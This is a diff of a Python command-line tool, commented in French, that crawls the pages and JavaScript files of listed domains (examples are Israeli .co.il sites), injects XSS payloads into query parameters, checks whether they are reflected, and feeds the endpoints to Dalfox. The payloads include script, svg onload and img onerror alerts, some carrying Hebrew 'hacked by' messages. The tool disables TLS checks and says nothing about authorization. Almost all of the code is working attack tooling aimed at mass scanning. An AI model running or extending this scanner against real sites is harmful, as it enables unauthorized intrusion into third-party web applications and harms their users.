@@ -2,19 +2,20 @@ import os
 import subprocess
 import questionary
 import httpx
+import re
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse, parse_qs, urlencode
-from translate import Translator  # Utilisé pour traduire les payloads
+from translate import Translator
 
-# Couleurs
+# Couleurs pour affichage
 GREEN = "\033[92m"
 RED = "\033[91m"
 RESET = "\033[0m"
 
-# Définir le traducteur pour l'hébreu
+# Initialisation du traducteur
 translator = Translator(to_lang="he")
 
-# Fonction de traduction en hébreu
+# --- Fonction pour traduire les payloads en hébreu ---
 def translate_to_hebrew(payloads):
     translated_payloads = []
     for payload in payloads:
@@ -24,130 +25,137 @@ def translate_to_hebrew(payloads):
             print(f"{RED}Erreur de traduction : {e}{RESET}")
     return translated_payloads
 
-# Charger les payloads depuis un fichier texte
-def load_payloads_from_file():
-    file_path = questionary.text("Entrez le chemin du fichier de payloads :").ask()
-    if not os.path.exists(file_path):
-        print(f"{RED}[-] Erreur : fichier non trouvé !{RESET}")
-        return []
-    
-    with open(file_path, "r", encoding="utf-8") as f:
-        payloads = [line.strip() for line in f.readlines()]
-    
-    return payloads
-
-# Scanner XSS avec Dalfox
-def scan_xss_dalfox(target):
-    print(f"{GREEN}[+] Scanning XSS with Dalfox: {target}{RESET}")
-    result = subprocess.run(["dalfox", "url", target], capture_output=True, text=True)
-    return result.stdout
-
-# Vérifier si le domaine est actif
-def is_domain_active(domain):
+# --- Fonction pour extraire les endpoints d'un site ---
+def extract_endpoints(domain):
     try:
-        response = httpx.get(domain, timeout=5)
-        return response.status_code < 400
-    except:
-        return False
+        response = httpx.get(domain, timeout=5, verify=False)
+        if response.status_code != 200:
+            return []
 
-# Extraire les paramètres en hébreu des URLs
-def extract_hebrew_params(url):
-    try:
-        response = httpx.get(url, timeout=5)
-        if response.status_code == 200:
-            soup = BeautifulSoup(response.text, "html.parser")
-            
-            params = set()
-            
-            # Récupérer les paramètres des liens
-            for link in soup.find_all("a", href=True):
-                parsed_url = urlparse(link["href"])
-                query_params = parse_qs(parsed_url.query)
-                for param in query_params:
-                    if any("\u0590" <= c <= "\u05FF" for c in param):  # Vérifie si l'URL contient de l'hébreu
-                        params.add(param)
-            
-            return list(params)
-        return []
+        soup = BeautifulSoup(response.text, "html.parser")
+        endpoints = set()
+
+        for link in soup.find_all("a", href=True):
+            url = link["href"]
+            if url.startswith("/") or domain in url:
+                endpoints.add(url if url.startswith("http") else domain + url)
+
+        for script in soup.find_all("script", src=True):
+            js_url = script["src"]
+            if not js_url.startswith("http"):
+                js_url = domain + js_url
+
+            try:
+                js_response = httpx.get(js_url, timeout=5, verify=False)
+                found_urls = re.findall(r"(https?://[^\s\"']+)", js_response.text)
+                endpoints.update(found_urls)
+            except:
+                pass
+
+        return list(endpoints)
     except:
         return []
 
-# Injecter les payloads XSS (normaux + traduits)
-def test_xss_with_hebrew_params(url, payloads):
-    params = extract_hebrew_params(url)
+# --- Fonction pour tester les XSS sur les paramètres ---
+def test_xss(url, payloads):
+    parsed_url = urlparse(url)
+    params = parse_qs(parsed_url.query)
+
     if not params:
-        print(f"{RED}[-] Aucun paramètre en hébreu détecté sur {url}{RESET}")
         return None
 
-    print(f"{GREEN}[+] Paramètres détectés : {params}{RESET}")
+    print(f"{GREEN}[+] Test des paramètres : {list(params.keys())}{RESET}")
 
     for param in params:
         for payload in payloads:
             injected_params = {param: payload}
-            injected_url = f"{url}?{urlencode(injected_params)}"
+            injected_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(injected_params)}"
+
             print(f"{GREEN}[+] Test XSS : {injected_url}{RESET}")
             
-            response = httpx.get(injected_url, timeout=5)
-            if payload in response.text:
-                print(f"{RED}[!] XSS trouvé sur {url} avec paramètre {param}{RESET}")
-                return injected_url  # Renvoie la première URL vulnérable
+            try:
+                response = httpx.get(injected_url, timeout=5, verify=False)
+                if payload in response.text:
+                    print(f"{RED}[!] XSS trouvé sur {url} avec paramètre {param}{RESET}")
+                    return injected_url
+            except:
+                pass
 
     return None
 
-# Fonction principale
+# --- Scanner avec Dalfox ---
+def scan_with_dalfox(targets):
+    print(f"{GREEN}[+] Scan XSS avec Dalfox...{RESET}")
+    try:
+        result = subprocess.run(["dalfox", "pipe"], input="\n".join(targets), text=True, capture_output=True)
+        return result.stdout
+    except Exception as e:
+        print(f"{RED}Erreur avec Dalfox : {e}{RESET}")
+        return ""
+
+# --- Fonction principale ---
 def main():
     choix = questionary.select(
-        "Comment souhaitez-vous scanner les sites ?",
+        "Comment scanner les sites ?",
         choices=["📄 Depuis un fichier .txt", "🌐 Entrer un domaine manuellement"]
     ).ask()
 
     if choix == "📄 Depuis un fichier .txt":
-        fichier = questionary.text("Entrez le chemin du fichier contenant les domaines :").ask()
+        fichier = questionary.text("Entrez le fichier contenant les domaines :").ask()
         if not os.path.exists(fichier):
             print(f"{RED}[-] Erreur : fichier non trouvé !{RESET}")
             return
 
         with open(fichier, "r") as f:
             domaines = [line.strip() for line in f.readlines()]
-    
     else:
         domaine = questionary.text("Entrez le domaine à scanner (ex: https://exemple.co.il)").ask()
         domaines = [domaine]
 
     print(f"{GREEN}[+] Vérification des domaines actifs...{RESET}")
-    domaines = [d for d in domaines if is_domain_active(d)]
+    domaines = [d for d in domaines if httpx.get(d, timeout=5, verify=False).status_code < 400]
+    
     if not domaines:
         print(f"{RED}[-] Aucun domaine actif trouvé.{RESET}")
         return
 
-    # Charger les payloads standards
     default_payloads = [
         "<script>alert('XSS')</script>",
-        "כ<script>alert('נפרץ על ידי טראחקנון')</script>",  # Hébreu : "Hacking"
+        "כ<script>alert('נפרץ על ידי טראחקנון')</script>",  # Hébreu : "Hacked"
         "'><svg/onload=alert('פריצה')>",
+        "<img src=x onerror=alert('XSS')>",
+        "<body onload=alert('XSS')>"
     ]
 
-    # Demander si l'utilisateur veut ajouter ses propres payloads
-    use_custom_payloads = questionary.confirm("Voulez-vous ajouter des payloads personnalisés ?").ask()
+    use_custom_payloads = questionary.confirm("Ajouter des payloads personnalisés ?").ask()
     if use_custom_payloads:
-        custom_payloads = load_payloads_from_file()
-        translated_payloads = translate_to_hebrew(custom_payloads)
-        all_payloads = default_payloads + translated_payloads
+        file_path = questionary.text("Entrez le fichier contenant les payloads :").ask()
+        if os.path.exists(file_path):
+            with open(file_path, "r", encoding="utf-8") as f:
+                custom_payloads = [line.strip() for line in f.readlines()]
+            translated_payloads = translate_to_hebrew(custom_payloads)
+            all_payloads = default_payloads + translated_payloads
+        else:
+            print(f"{RED}[-] Erreur : fichier non trouvé !{RESET}")
+            all_payloads = default_payloads
     else:
         all_payloads = default_payloads
 
     print(f"{GREEN}[+] Début du scan XSS...{RESET}")
     with open("resultats_xss_hebrew.txt", "w") as result_file:
         for site in domaines:
-            print(f"{GREEN}[+] Scanning : {site}{RESET}")
-            
-            dalfox_result = scan_xss_dalfox(site)
-            vulnerable_url = test_xss_with_hebrew_params(site, all_payloads)
-            
-            result_file.write(f"--- Résultats pour {site} ---\n")
-            result_file.write(dalfox_result + "\n")
-            if vulnerable_url:
-                result_file.write(f"⚠️ XSS détecté sur : {vulnerable_url}\n")
+            print(f"{GREEN}[+] Scan : {site}{RESET}")
+
+            endpoints = extract_endpoints(site)
+            print(f"{GREEN}[+] {len(endpoints)} endpoints trouvés sur {site}{RESET}")
+
+            for endpoint in endpoints:
+                vulnerable_url = test_xss(endpoint, all_payloads)
+                if vulnerable_url:
+                    result_file.write(f"⚠️ XSS détecté sur : {vulnerable_url}\n")
+
+            dalfox_result = scan_with_dalfox(endpoints)
+            result_file.write(f"--- Résultats Dalfox pour {site} ---\n{dalfox_result}\n")
 
     print(f"{GREEN}[+] Scan terminé. Résultats sauvegardés dans 'resultats_xss_hebrew.txt'.{RESET}")
 
